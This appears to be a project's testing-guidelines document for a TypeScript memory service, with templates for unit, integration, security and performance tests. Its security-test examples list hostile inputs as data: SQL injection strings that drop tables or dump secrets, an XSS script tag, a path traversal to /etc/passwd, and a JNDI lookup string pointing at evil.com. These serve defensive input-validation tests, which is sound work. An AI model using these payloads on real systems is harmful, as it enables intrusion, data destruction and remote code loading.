# Standardized Testing Guidelines

This document provides comprehensive guidelines for writing consistent, maintainable, and effective tests in the Cortex Memory MCP project.

## Table of Contents

1. [Test Structure Standards](#test-structure-standards)
2. [Test Patterns](#test-patterns)
3. [Mock Management](#mock-management)
4. [Performance Testing](#performance-testing)
5. [Security Testing](#security-testing)
6. [Error Handling](#error-handling)
7. [Test Data Management](#test-data-management)
8. [CI/CD Integration](#cicd-integration)
9. [Best Practices](#best-practices)

## Test Structure Standards

### File Organization

```
tests/
├── framework/           # Testing utilities and setup
│   ├── standard-test-setup.ts
│   ├── mock-manager.ts
│   └── test-validation.ts
├── unit/               # Unit tests for individual components
├── integration/        # Integration tests for component interactions
├── security/          # Security-focused tests
├── performance/       # Performance tests
├── e2e/              # End-to-end tests
└── setup.ts          # Global test configuration
```

### File Naming Conventions

- Unit tests: `*.test.ts` or `*.spec.ts`
- Integration tests: `*-integration.test.ts`
- Security tests: `*-security.test.ts`
- Performance tests: `*-performance.test.ts`
- E2E tests: `*-e2e.test.ts`

### Test File Template

```typescript
/**
 * [Brief description of what is being tested]
 *
 * [More detailed description including:
 * - Main functionality being tested
 * - Edge cases covered
 * - Integration points tested]
 */

import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { TestPatterns, TestUtils, MockManager } from '../../framework/standard-test-setup.js';
import { ComponentUnderTest } from '../../src/component.js';

// Apply appropriate test pattern
TestPatterns.unitTest(); // or integrationTest(), securityTest(), performanceTest()

describe('Component Name', () => {
  let component: ComponentUnderTest;
  let testContext: any;

  beforeEach(() => {
    testContext = TestUtils.createTestContext({
      category: 'component-category',
      // other context data
    });

    component = new ComponentUnderTest();
  });

  afterEach(() => {
    // Cleanup if needed
    MockManager.clearAllMocks();
  });

  describe('Feature Group 1', () => {
    it('should do something specific', async () => {
      // Arrange
      const input = TestUtils.generateTestData({ /* test data */ });

      // Act
      const result = await component.doSomething(input);

      // Assert
      expect(result).toBeDefined();
      expect(result.property).toBe(expectedValue);
    });
  });
});
```

## Test Patterns

### Unit Tests

Use `TestPatterns.unitTest()` for isolated component testing:

```typescript
TestPatterns.unitTest(
  // Optional setup function
  async () => {
    // Setup mocks and dependencies
    MockManager.mockModule('dependency', mockImplementation);
  },
  // Optional teardown function
  async () => {
    // Cleanup
  }
);
```

**Characteristics:**
- Test single components in isolation
- Use mocks for external dependencies
- Fast execution (under 100ms per test)
- Focus on business logic

### Integration Tests

Use `TestPatterns.integrationTest()` for testing component interactions:

```typescript
TestPatterns.integrationTest(
  // Global setup
  async () => {
    // Setup integration environment
  },
  // Global teardown
  async () => {
    // Cleanup integration environment
  }
);
```

**Characteristics:**
- Test multiple components working together
- Use real implementations where possible
- Slower execution (under 1 second per test)
- Focus on integration points and data flow

### Security Tests

Use `TestPatterns.securityTest()` for security-focused testing:

```typescript
TestPatterns.securityTest();
```

**Characteristics:**
- Test input validation and sanitization
- Test attack prevention mechanisms
- Test secure data handling
- Verify no sensitive data leakage

### Performance Tests

Use `TestPatterns.performanceTest(maxDuration)` for performance validation:

```typescript
TestPatterns.performanceTest(1000); // 1 second max duration
```

**Characteristics:**
- Test performance thresholds
- Measure resource utilization
- Test scalability
- Use performance measurement utilities

## Mock Management

### Mock Factory Usage

```typescript
// Create mocks using factory
const mockDb = CommonMocks.qdrantClient();
const mockAuth = CommonMocks.authService();

// Register for automatic cleanup
MockManager.registerMock('myService', mockService);
```

### Module Mocking

```typescript
// Mock entire modules
MockManager.mockModule('external-dependency', {
  default: mockImplementation,
  specificFunction: vi.fn()
});
```

### Mock Best Practices

1. **Always clean up mocks**: Use `MockManager.clearAllMocks()` in `afterEach`
2. **Use descriptive names**: Register mocks with meaningful names
3. **Mock at the right level**: Mock external dependencies, not internal implementation
4. **Verify interactions**: Use `expect(mockFunction).toHaveBeenCalledWith(...)` when relevant

## Performance Testing

### Performance Measurement

```typescript
const { result, duration } = await TestUtils.measurePerformance(
  async () => {
    return await someOperation();
  },
  1000 // Max duration in ms
);

expect(result).toBeDefined();
expect(duration).toBeLessThan(1000);
```

### Thresholds and Benchmarks

Define performance thresholds for different operations:

```typescript
const PERFORMANCE_THRESHOLDS = {
  SINGLE_QUERY_MAX_MS: 100,
  BATCH_QUERY_MAX_MS: 1000,
  CONCURRENT_QUERY_MAX_MS: 2000,
  MEMORY_USAGE_MAX_MB: 100,
};
```

### Load Testing

```typescript
// Sustained load test
const loadTestDuration = 5000; // 5 seconds
const requestInterval = 50; // Request every 50ms

const startTime = Date.now();
let requestCount = 0;

while (Date.now() - startTime < loadTestDuration) {
  await performOperation();
  requestCount++;
  await new Promise(resolve => setTimeout(resolve, requestInterval));
}

const requestsPerSecond = (requestCount / loadTestDuration) * 1000;
expect(requestsPerSecond).toBeGreaterThan(MIN_THROUGHPUT);
```

## Security Testing

### Input Validation Tests

```typescript
const maliciousInputs = [
  "admin'; DROP TABLE users; --",
  '<script>alert("xss")</script>',
  '../../../etc/passwd',
  '${jndi:ldap://evil.com/a}'
];

for (const input of maliciousInputs) {
  const result = await component.processInput(input);
  expect(result.success).toBe(false);
  expect(result.error).not.toContain(input); // Don't echo malicious input
}
```

### Authentication/Authorization Tests

```typescript
// Test privilege escalation
const user = { role: 'user' };
const adminAction = 'delete:all_users';

const canPerform = await auth.canUserAction(user, adminAction);
expect(canPerform).toBe(false);
```

### Data Leakage Prevention

```typescript
// Verify no sensitive data in logs
expect(mockLogger.error).not.toHaveBeenCalledWith(
  expect.stringContaining('password')
);

// Verify error messages don't expose sensitive information
expect(result.error).not.toContain('internal_error_details');
```

## Error Handling

### Error Testing Patterns

```typescript
// Test expected errors
await expect(component.operation(invalidInput))
  .rejects.toThrow('Expected error message');

// Test error handling
try {
  await component.operation(willFail);
} catch (error) {
  expect(error.code).toBe('EXPECTED_ERROR_CODE');
  expect(error.message).not.toContain('stack trace');
}
```

### Graceful Degradation

```typescript
// Test fallback behavior
const result = await component.operationWithFallback(primaryInput);
expect(result.fallbackUsed).toBe(true);
expect(result.data).toBe(fallbackData);
```

## Test Data Management

### Test Data Generation

```typescript
// Use standardized test data generators
const testEntity = global.testUtils.generateEntity({
  name: 'test-entity',
  metadata: { custom: 'value' }
});

const batchItems = global.testUtils.generateBatchItems(10, {
  kind: 'observation'
});
```

### Data Consistency

```typescript
// Ensure test data consistency across tests
beforeEach(() => {
  // Reset or setup consistent test data
  testContext.testData = TestUtils.generateTestData({
    // Consistent base data
  });
});
```

### Cleanup

```typescript
afterEach(async () => {
  // Clean up any created data
  if (testContext.createdIds) {
    await cleanupData(testContext.createdIds);
  }
});
```

## CI/CD Integration

### Test Validation

```typescript
// Use test validation utilities
import { TestValidator } from '../framework/test-validation.js';

// Validate test files meet standards
const validationResults = TestValidator.validateFiles(testFilePaths);
expect(validationResults[filePath].valid).toBe(true);
```

### Coverage Requirements

- Unit tests: >90% line coverage
- Integration tests: >80% branch coverage
- Security tests: 100% for security-critical paths
- Performance tests: All performance thresholds must pass

### Test Categories

```typescript
// Tag tests for different CI stages
describe('Component Tests', () => {
  it('should pass unit tests', () => {
    // Fast tests for every commit
  });

  it('should pass integration tests', () => {
    // Slower tests for PR validation
  });

  it('should pass security tests', () => {
    // Security tests for main branch
  });

  it('should pass performance tests', () => {
    // Performance tests for releases
  });
});
```

## Best Practices

### General Guidelines

1. **Test behavior, not implementation**: Focus on what the component does, not how it does it
2. **Use descriptive test names**: Test names should clearly describe what is being tested
3. **Arrange, Act, Assert**: Structure tests with clear setup, execution, and verification phases
4. **One assertion per test**: Keep tests focused on a single behavior
5. **Use meaningful test data**: Test data should reflect real-world scenarios

### Code Organization

1. **Group related tests**: Use `describe` blocks to organize related test cases
2. **Share setup code**: Use `beforeEach` for common setup, `beforeAll` for expensive setup
3. **Avoid test dependencies**: Tests should be able to run independently
4. **Keep tests simple**: Avoid complex logic in test code

### Performance Considerations

1. **Use mocks for expensive operations**: Database calls, network requests, etc.
2. **Limit test data size**: Use the minimum data needed for meaningful tests
3. **Optimize test execution**: Run tests in parallel where possible
4. **Monitor test performance**: Track test execution times and optimize slow tests

### Security Considerations

1. **Never commit real credentials**: Use environment variables or test fixtures
2. **Sanitize test logs**: Ensure no sensitive data appears in test output
3. **Test security boundaries**: Verify authentication, authorization, and input validation
4. **Test for common vulnerabilities**: SQL injection, XSS, CSRF, etc.

### Debugging and Maintenance

1. **Use meaningful assertions**: Provide clear error messages when tests fail
2. **Log test context**: Include relevant information when tests fail
3. **Keep test data accessible**: Make it easy to reproduce test failures
4. **Regular maintenance**: Update tests as the codebase evolves

## Example Test Scenarios

### Basic Unit Test

```typescript
it('should validate user input correctly', () => {
  const invalidInput = { name: '', email: 'invalid-email' };
  const result = validator.validate(invalidInput);

  expect(result.valid).toBe(false);
  expect(result.errors).toContain('Name is required');
  expect(result.errors).toContain('Invalid email format');
});
```

### Integration Test

```typescript
it('should complete user registration flow', async () => {
  const userData = global.testUtils.generateTestUser();

  // Register user
  const registration = await authService.register(userData);
  expect(registration.success).toBe(true);

  // Verify email
  const verification = await authService.verifyEmail(registration.token);
  expect(verification.verified).toBe(true);

  // Login with verified account
  const login = await authService.login(userData.email, userData.password);
  expect(login.success).toBe(true);
});
```

### Security Test

```typescript
it('should prevent SQL injection in search queries', async () => {
  const maliciousQueries = [
    "'; DROP TABLE users; --",
    "' OR '1'='1",
    "admin' UNION SELECT * FROM secrets --"
  ];

  for (const query of maliciousQueries) {
    const result = await searchService.search(query);
    expect(result.error).toBeDefined();
    expect(result.data).toBeUndefined();
  }
});
```

### Performance Test

```typescript
it('should handle large datasets efficiently', async () => {
  const largeDataset = global.testUtils.generateBatchItems(10000);

  const { result, duration } = await TestUtils.measurePerformance(
    () => databaseService.batchInsert(largeDataset),
    5000 // 5 second max
  );

  expect(result.success).toBe(true);
  expect(duration).toBeLessThan(5000);
  expect(result.inserted).toBe(10000);
});
```

## Conclusion

Following these guidelines ensures that our test suite is:

- **Consistent**: All tests follow the same patterns and conventions
- **Maintainable**: Tests are easy to understand, modify, and extend
- **Effective**: Tests catch real issues and provide confidence in the codebase
- **Efficient**: Tests run quickly and use resources wisely

Remember that tests are part of the product documentation and serve as a safety net for future development. Invest time in writing good tests, and they will pay dividends in code quality and developer productivity.